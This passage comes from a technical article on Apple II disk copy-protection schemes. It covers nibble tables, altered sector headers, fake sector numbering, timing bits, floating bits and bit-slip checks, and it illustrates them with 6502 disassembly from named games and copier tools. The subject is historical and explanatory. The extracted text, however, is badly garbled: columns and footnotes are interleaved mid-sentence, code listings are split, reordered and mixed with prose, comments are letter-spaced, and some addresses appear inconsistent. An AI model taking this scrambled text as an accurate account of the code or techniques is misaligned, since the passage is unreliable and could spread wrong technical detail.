19 = BE
29 = E5
39 = F9
0A = AC
1A = BF
2A = E6
3A = FA
0B = AD
1B = CB
2B = E7
3B = FB
0C = AE
1C = CD
2C = E9
3C = FC
0D = AF
1D = CE
2D = EA
3D = FD
0E = B2
1E = CF
2E = EB
3E = FE
0F = B3
1F = D3
2F = EC
3F = FF
DOS reserved two values from our fourth table—
#$AA and #$D5—for the prologue signatures. These
values are good candidates for the purpose of iden-
tifying the headers, because they do not conform to
the “at least one pair of consecutive one-bits” cri-
terion, and thus do not conflict with the entries in
the “nibbilisation” table. It is not a coincidence that
they have alternating bit values; #$D5 is #$55 with-
out the sign bit. By reserving these values, it en-
sures that the bitstream generated by arbitrary sec-
tor data cannot contain a long string of ones (pre-
vented by reserving #$FF), or alternating zeroes and
ones (prevented by reserving #$AA and #$D5), re-
gardless of the user’s data.
The third value of the prologue signature (#$96
or #$AD) need be unique only between the headers,
in order to distinguish between the two. The combi-
nation of unique values and non-unique values still
produces a unique sequence.
DOS reserved one value from our fourth table—
#$AA—for the second byte of the epilogue signatures,
for the same reason as for the prologue. The first
byte of the epilogue signature need not be unique
with respect to sector data (because the combina-
tion of unique values and non-unique values still pro-
duces a unique sequence), but obviously it must not
match the first byte of the prologue, because the
third byte of the epilogue (intended to be #$EB) is
written sometimes with only limited success (and it
is never verified for this reason), and so could poten-
tially be read as the third byte of a prologue instead,
with unpredictable results.
The decoding process requires a reverse transfor-
mation, via a table which is typically filled with all
of the values in a six-bit number. (See the sections
on Race Conditions and SpiraDisc for two counter-
examples.) The layout of the table is the special
thing, though—the nibbles that are read from disk
are used as an index into the table, in order to re-
cover the original six-bit value. So the table has
gaps between some of the values, because the legal
values of the nibbles are not consecutive.
Note that convention is a powerful force. There
is no reason for the table to have the nibbilisation
entries in that order, or to exclude #$AA or #$D5 (or
any of the other 15 entries from the last table) from
the set. Further, according to John Brooks, it is pos-
sible to use all 81 values from our first table, com-
bined with a special encoding method, which would
increase the data density by 105.5%, and potentially
even more. 43
7.9
Write-protection
The absolute simplest possible protection against a
copy is to check if the disk is write-protected. The
vast majority of owners of duplicated software won’t
bother to write-protect the disk. If the disk is not
write-protected, then the image is considered to be
a copy, rather than the original.
Alien Addition uses this technique.
1 ; assumes s l o t
7975
LDA
3 7978
LDA
797B
BPL
enabled
6
$C0ED
$C0EE
$7985
; request status
; read s t a t u s
; taken i f write −
A more generic version of the technique is
slightly longer:
0000
2 0002
0005
4 0008
LDX
LDA
LDA
BPL
enabled
$2B
$C08D , X
$C08E , X
$0008
; f e t c h s l o t ( x16 )
; request status
; read s t a t u s
; hang i f w r i t e −
7.10 Sector-level protections
7.10.1 Altered prologue/epilogue
This is one of the simpler techniques available, and
was used by many titles. Standard DOS 3.3 uses
43 http://www.bigmessowires.com/2015/08/27/apple-ii-copy-protection/#comment-227325
44the sequence #$D5 #$AA #$96 to identify the ad-
dress field prologue, #$D5 #$AA #$AD to identify the
data field prologue, and #$DE #$AA to identify both
of the epilogues. Of course, it is possible to choose
from the 17 values from our fifth table, for either the
first two bytes of the prologue values, or the second
byte of the epilogue. It is also possible to choose
from among the 81 values from our first table, for
either the third byte of the prologue, or the first byte
of the epilogue.
Most commonly, only one value is changed in the
prologue or epilogue, and that same value is used for
every sector on every track of the disk.
Lucifer’s Realm uses this technique; the epilogue
was changed from #$DE #$AA to #$DF #$AA.
The Tracer Sanction extended the technique by
carrying a table of values, and using a different value
for each track.
Masquerade extended the technique to the sec-
tor level, by requiring that each even sector has one
value, and each odd sector has another value. The
routine extracts bit zero of the sector number, and
then inverts it, to create the key which is applied to
the identification byte. Thus, even sectors use #$D5
(the standard value), and odd sectors use #$D4. This
is necessary because sector zero of track zero must
have the regular value in order to be readable by the
boot PROM.
The Coveted Mirror used exactly the same
technique–and almost the exact same code–at only
the track level.
Due to size limitations, the boot PROM does
not verify the epilogue bytes 44 allowing all sectors
on all tracks—including the boot sector itself—to be
protected. The most common technique involved al-
tering the epilogue values to something other than
the default value. This protection cannot be repro-
duced by a sector-copier or track-copier, which re-
quires the default values to be seen, because they
will fail to copy the sector. Operation Apocalypse
uses this technique.
Given that the boot PROM does not verify the
epilogue bytes, a very light protection technique is
to change the epilogue values to something other
than the default values for sector zero of track zero
only, leaving all other sectors readable. This pro-
tection cannot be reproduced by a sector-copier or
track-copier which requires the default values to be
seen, because they will fail to copy the boot-sector,
leaving the disk unusable. Alien Addition makes use
44 It
of this technique.
A common technique to defeat this protection is
to ignore read errors for all sectors, in the hope that
it is caused by the non-default epilogue values alone.
However, given the degrading state of floppy disks
these days, ignoring read errors can hide the fact
that the disk is truly failing.
The address field contains more than just the
track and sector numbers. It also contains a vol-
ume number. This value can be used as a quick
method to determine which disk from a set is cur-
rently inserted into the drive. However, support for
it—even in DOS—is poor. So many programs, in-
cluding DOS itself, assume that the volume number
is the default value. When it is changed, the read
fails. By hard-coding the new value in DOS, the
disk will be readable only by itself. Algebra Arcade
uses this technique.
This technique can also be used in a slightly dif-
ferent way. Since each sector can have its own vol-
ume number, any value can be put there, as long as
the program is aware of that fact.
Randamn sets the volume number to a check-
sum calculated from the current track and sector,
and hangs if the values do not match.
Both the address field and data field contain
a checksum of the data that precede it, prior to
the epilogue. The checksum algorithm is usually
a rolling exclusive-OR of each of the bytes, with a
zero seed. However, there is no requirement that
either of these things is used, for sectors other than
sector zero of track zero. For other sectors, the seed
can be set to any value, and the algorithm can be a
cumulative ADD or anything else at all. This pro-
tection cannot be reproduced by a sector-copier or
track-copier which relies on the regular algorithm,
because the disk will appear to be corrupted.
Hellfire Warrior uses a slight variation on this
technique. It maintains a counter at address $40,
which coincides with the track number which is
stored by the boot PROM. In order to break out
of the loop that reads sectors into memory, the pro-
gram requests the boot PROM to read a sector with
an intentionally bad checksum. This causes the boot
PROM to rewrite the value at address $40. The
new value is exactly what the program requires as
the exit condition. This protection cannot be re-
produced by a sector-copier or track-copier, because
they will fail to copy this sector, resulting in a disk
that has only sectors with good checksums. The disk
also ignores the address field checksum and volume number.
45will not boot because it will never exit the loop.
The volume number is normally an eight-bit
value. For efficiency of encoding it, DOS uses a “4-
and-4” encoding, where the four odd bits are sepa-
rated from the low even bits, and converted to nib-
bles. To recombine them, it is a simple matter to
shift the nibble holding the odd bits (“abcd”) one
to the left, resulting in an encoding that looks like
“a1b1c1d1”, and then to AND the result with the nib-
ble holding the even bits (“efgh”), whose encoding
that looks like “1e1f1g1h”. This method requires 16
bytes to describe the address field. Since the track,
sector, and checksum, are known to fit into six bits
each, it is easy to see that if the volume number is
disregarded, a “6-and-0” encoding can be used in-
stead. This method requires only four nibbles to
describe the address field. Algernon uses this tech-
nique.
The entries in the address field have a defined
order because the boot PROM needs to read them
to identify sector zero of track zero, and any other
sector which the PROM is asked to read. However,
it is possible to change the order of the entries for
other sectors on the disk, and then to read the sec-
tors manually.
7.10.2
7.10.3
More sectors
The standard DOS 3.3 format disk uses 16 individ-
ual sectors per track, with relatively large gaps be-
tween the sectors. Consider how much space would
be available if those sectors were combined into a
single large sector, with a single field that combines
both address (specifically, only the track number)
and data fields. Yes, it would require reading the
entire track in order to find the field again once the
track had been verified, but for some applications,
performance is not that critical. This is what Info-
com did, on programs such as A Mind Forever Voy-
aging. Once the track had been found, and the data
field found again, then the program read (and dis-
carded) sectors sequentially until the required one
was found. Again, if the performance is not that
critical, the fact that the routine can fetch only one
sector at a time is not an issue. In fact, the imple-
mentation works well enough for the text-adventure
scenario in which it was used. Since the user will
be reading the text while additional text is loading,
the time required for that loading goes mostly un-
noticed.
Consider how much space would be available if
those gaps were reduced to the minimum of five self-
synchronizing values before the address field pro-
logue, with just a few bytes of gap between the
address and data headers. Then reducing the pro-
logue byte count from three to two, and the epilogue
byte count from two to one. Consider how much
space would be available by merging groups of sec-
tors. If you converted the track into six sectors of
three times the size, you would have RWTS18. This
is a good compromise between speed and density.
On one side, having fewer sectors means less pro-
cessing; and on the other side, having more sectors
means less latency to find a sector. The RWTS18
routine also supports “read scattering” by assign-
ing a dummy write address to the pages that aren’t
needed.
This second technique was used very heavily by
Brøderbund, on programs such as Airheart (and
even three years later, on Prince of Persia), but other
companies made use of it, too, such as Infogrames
in Hold-Up. Interestingly, in the case of Airheart,
after compressing the title screen to reduce its size
Fewer sectors
The major reason for using 16 sectors per track is
because that is the maximum number that can fit
within the standard format created by DOS 3.3.
DOS 3.2 supported only 13 sectors per track, be-
cause of the limitation of the hardware regarding
consecutive zeroes. Copy protection techniques are
free to use fewer sectors than either of those values.
Wavy Navy uses ten sectors per track, while
Olympic Decathlon uses eleven and Karateka uses
a dozen. The sectors in these examples are all the
regular size, but encoded in a wasteful manner. (Pri-
marily the “4-and-4” encoding was used because the
decoder is very small, but sometimes “5-and-3” be-
cause the decoder looks weird when compared with
the more familiar “6-and-2” encoding.) The wasteful
encoding is the reason for the reduced sector count;
there really isn’t more room for more sectors.
46on the disk, the rest of the game fit on a regular
16-sector disk.
7.10.4
as by the volume number. A protection technique
could set every sector number to the same value in
the address field. It could set them all to zero, pro-
vided that the checksum algorithm is changed, so
that the boot PROM will read successfully only the
true sector zero, in order to boot the disk. It could
also use the volume number from the address field as
the page number in which to write the sector data.
This would be a very compact way to load data with-
out the need to pass the address as a parameter to
the loader.
Math Blaster has two sectors numbered zero
on track zero. The program distinguishes between
them by examining the first nibble after the address
field epilogue, but the checksum of the second sec-
tor zero also fails verification, which is why the boot
PROM does not see it. This protection cannot be re-
produced by a sector-copier or track-copier, because
those copiers will write only a single sector zero to
a track. It is unpredictable which of the two sector
zeroes would be written, but even if the true one is
chosen, the copy is revealed by the program missing
the duplicated sector.
Big sectors
There is no requirement to define multiple sectors
per track. It is possible to define a single sector that
spans the entire track. 45 However, there can be a
significant time penalty while reading such a track,
because it requires up to one complete rotation in
order to find the start of the sector.
Lady Tut uses a single sector per track, at a size
equivalent to eleven 256-bytes sectors.
7.10.5
Encoded sectors
As noted previously, there is no reason for a disk
to use our sixth table—there is no reason to have
the nibbilisation entries in that order, nor even to
use those values at all. Any alteration to the ta-
ble results in a disk that can be copied freely, but
whose contents cannot be read from the outside.
Further, the DOS on such a disk cannot write files
from the inside to the outside. The reason why the
read would fail is because the standard table would
be applied to data that requires the alternative ta-
ble to decode, resulting in the wrong decoding. The
reason why the write would fail is because the alter-
native table would be applied to data that requires
the standard table to encode, resulting in the wrong
encoding.
Maze Craze Construction Set uses an alternative
nibble table—all of the values from #$A9-FF from
our first table. These values might have been cho-
sen because they provide the least sparse array when
used as indexes.
Bop’N Wrestle uses the regular nibble table (and
a standard DOS 3.3), but in reverse order.
7.10.6
7.10.7
Sector numbering
The address field carries the sector number, but the
controller does not need or use this information,
except when the boot PROM is requested to read
a sector. Therefore, it is possible to have sectors
whose number is not in the range of zero to 15. 47
Any eight-bit value can be used, as long as the pro-
gram is expecting it. This protection cannot be re-
produced by a sector-copier, because the copier will
not copy those sectors at all.
7.10.8
Sector location
The address field carries the track and sector num-
ber, but the controller does not need or use this in-
formation, except when the boot PROM is requested
to read a sector. Therefore, it is possible for a sector
to “lie” about its location on the disk. For example,
the address field of sector three on track zero could
label itself as sector zero on track three. This protec-
tion cannot be reproduced by a sector-copier which
relies on DOS to perform the write, because they will
Duplicated sectors
The address field carries the sector number, but the
controller does not need or use this information, ex-
cept when the boot PROM is requested to read a
sector. Therefore, it is possible to have multiple
sectors with the same number. 46 There are numer-
ous ways in which they could be distinguished, such
45 This
would be the equivalent of about 18.5 256-bytes sectors in “6-and-2” encoding. Using 19 sectors is possible, if the full
range of values from the first figure is used, but it introduces a problem to identify the start of the sector, since there are no
single values that can be reserved exclusively. One possible solution is to find a sequence which cannot appear in user-data due
to particular characteristics of the decoding process. Just because it is possible, it doesn’t mean that it’s easy.
46 The same is true for the track number, and Jumble Jet has multiple tracks which claim to be track zero.
47 The same is true for the track number. That is, a number which is not in the range of zero to 34.
472
4
6
8
F 0 D
F
0
1
2
E
D
3
physical
sectors
C
4
5
B
A
logical
numbering
B
6
A
9
8
7
C E 1
3
9
7
5
gap: [7-8]
DOS
E
6
D
7
F 0 8
F
0
2
D
3
physical
sectors
C
4
5
B
5
logical
numbering
1
1
E
6
A
9
8
gap: 1
gap: [2-3]
7
C 4 B
3
9
2
A
D
C
B
E
F
0
1
2
E
D
2
3
physical
sectors
C
4
5
B
A
Pascal
F 0 1
6
A
9
8
7
9 8 7
6
3
4
5
Hard Hat Mack
(then ProDOS)
Figure 16 – Floppy sectors interleaving.
the copy will have no sectors that cannot be read.
not duplicate this information, because DOS will fill
in the address field by itself when placing the sector
on the disk. Thus, a program that seeks to a track
that contains “misplaced” sectors will not find any
misplaced sectors, or will receive the wrong content
instead.
Discover uses this technique; it changes the iden-
tity of one particular sector in the sector interleave
table, on one particular track.
7.10.9
7.10.11
The data for a sector is well defined, but apart from
the optional presence of the self-synchronizing val-
ues, the data between sectors is not defined at all.
As a result, it is not often copied, either. It is possi-
ble to place specific counts of specific values in this
location, which can be checked later. A program
can detect a copy by the absence or wrong count of
the special values.
Randamn checks the value of the byte immedi-
ately before the prologue of a particular sector, and
reboots if the value looks like a self-synchronizing
value. (A bit-copier might insert this values when
asked to match the track length, and a sector-copier
would always insert the value.)
Binomial Multiplication counts the number of
values that appear between the address field epi-
logue and the data field prologue, and between the
data field epilogue and the next sector address field
prologue, for all of the sectors on a particular track.
This protection cannot be reproduced by a sector-
copier or a track-copier, because those copiers will
discard the original data between the sectors.
Synchronised sectors
Since the approximate rotation speed of the drive
is known (∼300 RPM), it becomes possible to place
sectors at specific locations on a track, such that
they have a special position relative to other sec-
tors on the same track. This is difficult to repro-
duce because of the delay that is introduced while a
sector-copier is writing the data.
Hard Hat Mack takes this to the extreme, by re-
quiring that one track has all 16 sectors in incremen-
tal order. This protection is highly unlikely to be
reproduced by using a sector-copier, because after
factoring in the rotation speed of the drive, the next
sector is more likely to be placed halfway around the
disk.
7.10.10
Dead-space bytes
Bad sectors
Some protections rely on the fact that intentionally
bad sectors (for example, checksum mismatch in the
simplest case, but potentially physical damage could
be used, too) should return a read error.
Drelbs uses this technique. This protection can-
not be reproduced even with a bit-copier, because
7.10.12
Timing bits
The Disk ][ controller shifts in bits at a rate equiv-
alent to one bit every four CPU cycles, once the
48first one-bit is seen. Thus, a full nibble takes the
equivalent of 32 CPU cycles to shift in. After the
full nibble is shifted in, the controller holds it in the
QA switch of the Data Register for the equivalent of
another four CPU cycles, to allow it to be fetched
reliably. After those four CPU cycles elapse, and
once a one-bit is seen, the QA switch of the Data
Register will be zeroed, and then the controller will
begin to shift in more bits. The significant part of
that statement is “once a one-bit is seen.” It is pos-
sible to intentionally introduce “timing” (zero) bits
into the stream in order to delay the reset. For each
zero-bit that is present, the previous value will be
held for another eight CPU cycles. For code that is
not expecting these zero-bits to be present, a nib-
ble that is being held back will be indistinguishable
from a nibble that has newly arrived.
Creation uses this technique. It looks like this:
; wait f o r n i b b l e to a r r i v e
2 B94F
LDA
$C08C ,X
B952
BPL
$B94F
4 ; watch f o r #$D5
B954
CMP
#$D5
6 B956
BNE
$B948
; delay to ensure > 4 c y c l e s w i l l e l a p s e
8 ; b e f o r e the next read occurs
B958
NOP
10 ; r e a d data l a t c h
B959
LDA
$C08C ,X
12 ; c h e c k i f n i b b l e has changed
; i f z e r o −b i t i s p r e s e n t ,
14 ; then r e a d v a l u e l a s t s l o n g e r
B95C
CMP
#$D5
16 B95E
BEQ
$B972
20 ; s h i f t c a r r y i n t o A
4056
ROL
22 ; u n t i l a s e t b i t i s s h i f t e d out
; ( t a k e s f i v e rounds )
24 4057
BCS
$4064
; wait f o r n i b b l e to a r r i v e
26 4059
LDY
$C08C ,X
405C
BPL
$4059
;2 cycles
28 ; watch f o r #$FF
405E
CPY
#$FF
;2 cycles
30 4060
BNE
$403A
;2 cycles
4062
BEQ
$404F
;3 cycles
32 ; w a i t f o r n i b b l e t o a r r i v e
4064
LDY
$C08C ,X
34 4067
BPL
$4064
; remember i t s v a l u e
36 4069
STY
$07
; c h e c k i f p r o p e r p a t t e r n was s e e n
38 ; ( a l t e r n a t i n g z e r o −b i t y e s and no )
406B
CMP
#$0A
40 406D
BNE
$403A
; wait f o r n i b b l e to a r r i v e
42 406F
LDA
$C08C ,X
4072
BPL
$406F
44 ; checksum a g a i n s t p r e v i o u s v a l u e
; both must be #$FF t o p a s s
46 4074
SEC
4075
ROL
48 4076
AND
$07
4078
EOR
#$FF
50 407A
BEQ
$4080
The timing loop is long enough for four nibbles
to be shifted in if no zero-bit is present, resulting in
a value of at least #$08. (Specifically the right-hand
“F” from the value “FF”.) If a zero-bit is present,
then fewer than four nibbles will be shifted in, re-
sulting in a value of less than #$08. This explains
the “CPY #$08” instruction at $4054. It is checking
if a one-bit has been shifted in four times or three
times.
The “CMP #$0A” instruction at $406B is check-
ing the final results of the multiple CPYs that were
made. In binary, the results look like 01010 but
prior to that, the results progress like this:
00010000
00100001
01000010
10000101
00001010
That means it is expecting the first pass to have
a value of less than eight (carry clear), then a value
of at least eight (carry set), then a value of less than
eight (carry clear), then a value of at least eight
(carry set), and finally a value of less than eight
(carry clear), followed by two “FF”s. That requires
the stream to look like FB 0 FF FF 0 FF FF 0 Fx
Hacker II requires a pattern of zero-bits to be
present in the stream. The effect of the delayed
shift becomes clear when we count cycles.
; i n i t i a l i s e mask
2 403A
LDA
#$08
...
4 ; wait f o r n i b b l e to a r r i v e
4044
LDY
$C08C ,X
6 4047
BPL
$4044
;2 cycles
; watch f o r #$FB
8 4049
CPY
#$FB
;2 cycles
404B
BNE
$403A
;2 cycles
10 ; not a do−n o t h i n g i n s t r u c t i o n !
; e x i s t s t o be t i m i n g −i d e n t i c a l
12 ; t o t h e BEQ a t $4062
404D
BEQ
$404F
;3 cycles
14 404F
NOP
;(2 cycles )
4050
NOP
;(2 cycles )
16 ; r e a d data l a t c h
4051
LDY
$C08C ,X
;(4 cycles )
18 ; c h e c k how many b i t s have s h i f t e d i n
4054
CPY
#$08
49FF FF
7.10.13
Floating bits
What happens if more than two consecutive zero-
bits are present in a stream? Something random.
The Automatic Gain Control circuit will eventually
insert a one-bit because of amplified noise. It might
happen immediately after the second zero-bit, or
it might happen after several more zero-bits. The
point is that reading that part of the stream repeat-
edly will yield different responses
Mr. Do! uses this technique.
; change s t a t e
50 0756
INC
$07C2
0759
BNE
$2761
52 ; s t o r e l a s t r e a d v a l u e on f i r s t p a s s
075B
STA
$07C3
54 ; a l l o w c o m p l e t e r e v o l u t i o n and r e a d a g a i n
075E
JMP
$071D
56 ; c h e c k l a s t r e a d v a l u e on s u b s e q u e n t p a s s
; must be d i f f e r e n t from t h e f i r s t p a s s
58 0761
CMP
$07C3
0764
BNE
$0771
60 ; r e t r y up t o f o u r t i m e s
0766
INC
$07C2
62 0769
LDA
$07C2
076C
CMP
#$08
64 076E
BNE
$271D
; s e t c o u n t e r t o be used l a t e r
2 0710
LDY
#$06
...
4 ; set state
0713
LDA
#$FF
6 0715
STA
$07C2
; wait f o r n i b b l e to a r r i v e
8 0718
LDA
$C088 ,X
071B
BPL
$0718
10 ; watch f o r #$D5
071D
CMP
#$D5
12 071F
BNE
$0718
; wait f o r n i b b l e to a r r i v e
14 0721
LDA
$C088 ,X
0724
BPL
$0721
16 ; watch f o r #$9B
0726
CMP
#$9B
18 0728
BNE
$071D
; wait f o r n i b b l e to a r r i v e
20 072A
LDA
$C088 ,X
072D
BPL
$072A
22 ; watch f o r #$AB
072F
CMP
#$AB
24 0731
BNE
$071D
; wait f o r n i b b l e to a r r i v e
26 0733
LDA
$C088 ,X
7036
BPL
$0733
28 ; watch f o r #$B2
0738
CMP
#$B2
30 073A
BNE
$071D
; wait f o r n i b b l e to a r r i v e
32 073C
LDA
$C088 ,X
073F
BPL
$073C
34 ; watch f o r #$9E
0741
CMP
#$9E
36 0743
BNE
$071D
; wait f o r n i b b l e to a r r i v e
38 0745
LDA
$C088 ,X
0748
BPL
$0745
40 ; watch f o r #$BE
074A
CMP
#$BE
42 074C
BNE
$071D
; wait f o r n i b b l e to a r r i v e
44 074E
LDA
$C088 ,X
0751
BPL
$074E
46 ; l o o p s i x t i m e s
0753
DEY
48 0754
BNE
$074E
On the first pass, the program watches for the
sequence $#D5 #$9B #$AB #$B2 #$9E #$BE, skips
the next five nibbles, and then reads and saves the
sixth nibble. On subsequent passes, the program
watches again for the sequence $#D5 #$9B #$AB
#$B2 #$9E #$BE, skips the next five nibbles, and
then reads and compares the sixth nibble against
the sixth nibble that was read initially. The value
that is read will always be a legal value, but on the
original disk, with multiple zero-bits in the stream,
the value that was read in one of the subsequent
passes will not match the value that was read in
the first pass. No matter how many extra zero-bits
existed in the stream, the bit-copier will not write
them out. Instead, it will “freeze” the appearance
of the stream, and normalise it so that there are no
more than two zero-bits emitted. As a result, the
sixth nibble that was read will have the same value
for all passes, and therefore fail the protection check
7.10.14
Nibble count
Since a track is simply a stream of bits, it is possible
to control the layout of the values in that stream, as
long as it follows the rules of the hardware. The
number of self-sychronizing values can be reduced
to a single set of the minimum number, if perfor-
mance is not a consideration. That means there are
no other zero-bits present on the track. However, a
bit-copier cannot detect the zero-bits reliably (nei-
ther their presence, nor their number), so it is left to
guess if the value #$FF must be stored using eight
or ten bits. (That is, if it is a data nibble or a
self-synchronizing value.) If there are enough #$FF
bytes on a track, and if the bit-copier assumes that
every one of them must be ten bits wide, then it
is possible that the bit-copier will write more data
50Duplicator (E.D.D.), but apart from the BPL in-
struction, it is shared by Copy ][+. (Someone
copied!) Normally, a nibble will be shifted in be-
fore TDL2 completes, so that TDS2 is reached, and
the nibble is stored intact. However, by using only
six fetches, the code is vulnerable to a well-placed
timing bit, such that the BPL will be reached just
before the last bit of the nibble is shifted in. That
three-cycle time penalty when the branch is taken
is just enough that, when combined with the two-
cycle instruction before it, the shift will complete,
and the four CPU cycles will elapse, before the next
read occurs. The result is that the nibble is missed,
and the next few nibbles that arrive will reach TDS3
instead, losing one bit each. When those data are
written to disk by the bit-copier, the values will be
entirely wrong.
Create With Garfield: Deluxe Edition uses this
technique. (The original Create With Garfield uses
an entirely different protection.) It has one track
that is full of repeated sequences. Each of the se-
quences has a prologue of five bytes in length. Every
second one of the prologues has a timing bit after
each of the five bytes in the prologue. In the mid-
dle of the track is a collection of bytes which do not
match the sequence, so the track is essentially split
into two groups of these repeated sequences. The
size of the two groups is the same. When the bit-
copier attempts to read the data, the timing bits
cause about half of the sequences to be lost. What
remain are far fewer sequences than exist on the
original disk. (Enough of them that the bit-copier
mistakenly believes that it has copied the track suc-
cessfully.) A program can detect a copy by the small
count of these sequences. This technique is likely to
have been created to defeat E.D.Dṡpecifically, but
Copy ][+ is also affected. However, the protection
can be reproduced with the use of a peripheral that
connects to the drive controller (and thus see the
zero-bits for exactly what they are), or by inserting
an additional fetch in the software.
than can fit on the track, resulting in part of the
track being overwritten when the revolution com-
pletes before the write completes.
As a separate technique, it is also possible to re-
duce the speed of the drive while writing the data to
the original disk, resulting in a track that is so dense,
that the data cannot fit on a disk when written at
regular speed. This is known as a “fat” track.
The more common technique is to simply use a
sequence of nibbles with enough zero-bits between
them, that the “delayed fetch” effect is triggered.
(§7.10.12.) When the zero-bits are present, and if
the fetch is fast enough (that is, it polls the QA
switch of the Data Register while the top bit is clear,
stores the fetched value, and then resumes polling),
then there will appear to be more nibbles of a par-
ticular value than really exist, because the next bit
will not be ready to shift in. A program that counts
the number of nibbles will see more nibbles in the
copy than in the original.
If the fetch is slow enough. . . now, this is an in-
teresting case. Bit-copiers try to read the data as
quickly as it comes in. This is done not by polling
the QA switch of the Data Register, but by checking
if the top bit is already set, in an unrolled loop, like
this:
; 2 c y c l e delay so
2 ; s h i f t might f i n i s h
TDL1
NOP
4 ; try to detect timing b i t
LDA $C0EC , X
6 BMI TDS2
TDL2
LDA $C0EC , X
8 BMI TDS2
; timing b i t probably present
10 LDA $C0EC , X
BMI TDS3
12 LDA $C0EC , X
BMI TDS3
14 LDA $C0EC , X
BMI TDS3
16 LDA $C0EC , X
BMI TDS3
18 ; 3 c y c l e p e n a l t y i f t a k e n !
BPL TDL2
20 TDS2
STA ( $0 ) , Y
...
22 RTS
; s t o r e v a l u e with t i m i n g b i t
24 ; l o s e s one b i t a s a r e s u l t
TDS3
AND #$7F
26 STA ( $0 ) , Y
...
28 RTS
7.10.15
Bit-flip, or defeat bit-copiers with
this one weird trick
Deeply technical content follows. Prepare yourself!
Let’s take this simple sentence (sorry, but it’s the
best example that I could create at the time):
ITHASGOTTOBETHISLANDAHEAD
And split it according to some potential word
boundaries:
IT HAS GOT TO BE THIS LAND AHEAD
This code is a disassembly from Essential Data
51Now we skip a bit:
OTTO BETH ISLAND AHEAD
A bit more:
TO BETH ISLAND AHEAD
A bit more still:
BET HIS L AND A HEAD
Okay, that last one doesn’t make much sense,
but I wanted a sentence which could be read differ-
ently, depending on where you started reading, as
opposed to a series of arbitrary overlapping words.
In any case, it’s clear that depending on where you
start reading, you can get vastly different results.
Something similar is possible while reading the bit-
stream from the disk. After a nibble is shifted in
(determined by the top bit being set), and the four
CPU cycles have elapsed, and once the one-bit is
seen, then the QA switch of the Data Register is set
to zero. The absence of a counter allows the hard-
ware to be fooled about how many bits have been
read. Specifically, the controller can be convinced
to discard some of the bits that it has read from the
disk while forming a nibble, and then the starting
position within the stream will be shifted accord-
ingly. This is possible with a single instruction, in
conjunction with an appropriate delay.
After issuing an access of Q6H ($C08D+(slot ×
16)), the QA switch of the Data Register will receive
a copy of the status bits, where it will remain acces-
sible for four CPU cycles. After four CPU cycles,
the QA switch of the Data Register will be zeroed.
Meanwhile, assuming that the disk is spinning at
the time, the Logic State Sequencer (LSS) contin-
ues to shift in the new bits. When the QA switch of
the Data Register is zeroed, it discards the bits that
were already shifted in, and the hardware will shift
in bits as though nothing has been read previously.
Let’s see that in action
Tinka’s Mazes does it this way, beginning with
some preamble code which is common to many pro-
grams that used this technique
BB6A
LDY
#0
2 ; wait f o r n i b b l e to a r r i v e
BB6C
LDA
$C08C ,X
4 BB6F
BPL
$BB6C
BB71
DEY
6 ; r e t r y up t o 256 t i m e s
BB72
BEQ
$BBBB
8 ; watch f o r #$D5
BB74
CMP
#$D5
10 BB76
BNE
$BB6C
BB78
LDY
#0
12 ; w a i t f o r n i b b l e t o a r r i v e
BB7A
LDA
$C08C ,X
14 BB7D
BPL
$BB7A
BB7F
DEY
16 ; r e t r y up t o 256 t i m e s
BB80
BEQ
$BBBB
18 ; watch f o r #$E7
BB82
CMP
#$E7
20 BB84
BNE
$BB7A
; wait f o r n i b b l e to a r r i v e
22 BB86
LDA
$C08C ,X
BB89
BPL
$BB86
24 ; watch f o r #$E7
BB8B
CMP
#$E7
26 BB8D
BNE
$BBBB
; wait f o r n i b b l e to a r r i v e
28 BB8F
LDA
$C08C ,X
BB92
BPL
$BB8F
30 ; watch f o r #$E7
BB94
CMP
#$E7
32 BB96
BNE
$BBBB
52Here is the switch:
Time passes. . .
One bit is shifted in every four CPU cycles, so a
delay of 15 CPU cycles is enough for three bits to
be shifted in. Those bits are discarded. Back to our
stream. In binary, it looks like the following, with
the seemingly redundant zero-bits in bold.
11100111 0 11100111 00 11100111 11100111 0
11100111 00 11100111 11100111 0 11100111 0
11100111 11100111
However, by skipping the first three bits, the stream
looks like this:
00 11101110 0 11100111 00 11111100 11101110
0 11100111 00 11111100 11101110 0 11101110 0
11111100 111. . .
The old zero-bits are still in bold, and the newly
exposed zero-bits are in italics. We can see that the
old zero-bits form part of the new stream. This de-
codes to E7 FC EE E7 FC EE EE FC, and we have
our magic values
Programs from Epyx that use this protection do
not compare the values in the pattern. Instead, the
values are used as a key to decode the rest of the
data that are loaded. This hides the expected val-
ues, and causes the program to crash if they are
altered.
The Thunder Mountain version of Dig Dug uses
a slight variation on the technique, including a dif-
ferent preamble and switch. The company seems
to have kept the variation to themselves. (Bop’N
Wrestle from 1986 uses the same altered version,
and comes from Mindscape, but Mindscape owned
the Thunder Mountain label, so the connection is
clear.) 48 That version looks like this:
; t r i g g e r desync
2 BB98
LDA
$C08D ,X
BB9B
LDY
#$10
4 ; delay to ensure > 4 c y c l e s w i l l e l a p s e
; b e f o r e the next read oc curs
6 BB9D
BIT
$6
; wait f o r n i b b l e to a r r i v e
8 BB9F
LDA
$C08C ,X
BBA2
BPL
$BB9F
10 BBA4
DEY
; r e t r y up t o 16 t i m e s
12 BBA5
BEQ
$BBBB
; watch f o r #$EE
14 BBA7
CMP
#$EE
BBA9
BNE
$BB9F
16 BBAB
LDY
#7
; wait f o r n i b b l e to a r r i v e
18 BBAD
LDA
$C08C ,X
BBB0
BPL
$BBAD
20 ; compare backwards a g a i n s t t h e l i s t a t $BBC1
; E7 FC EE E7 FC EE EE FC
22 BBB2
CMP
( $48 ) ,Y
BBB4
BNE
$BBBB
24 BBB6
DEY
BBB7
BPL
$BBAD
26 ; p a s s
BBB9
CLC
28 BBBA
RTS
BBBB
DEC
$50
30 ; r e t r y i f count r e m a i n s
BBBD
BNE
$BB57
32 ; f a i l
BBBF
SEC
34 BBC0
RTS
BBC1
.BYTE
$FC , $EE , $EE , $FC , $E7 , $EE , $FC ,
$E7
But wait, there’s more! To see the bitstream
on disk, it looks like D5 E7 E7 E7 E7 E7 E7 E7 E7
E7 E7 E7 with some harmless zero-bits in between.
So from where do the other values come? Since the
magic is in the timing of the reads, we must count
cycles:
1 BB8F
BB92
3 BB94
BB96
5 BB98
BB9B
7 BB9D
; total :
LDA
$C08C ,X
BPL
$BB8F
CMP
#$E7
BNE
$BBBB
LDA
$C08D ,X
LDY
#$10
BIT
$6
15 c y c l e s
;2
;2
;2
;4
;2
;3
cycles
cycles
cycles
cycles
cycles
cycles
0224 LDY #$00
2 ; wait f o r n i b b l e to a r r i v e
0226 LDA $C08C ,X
4 0229 BPL $2226
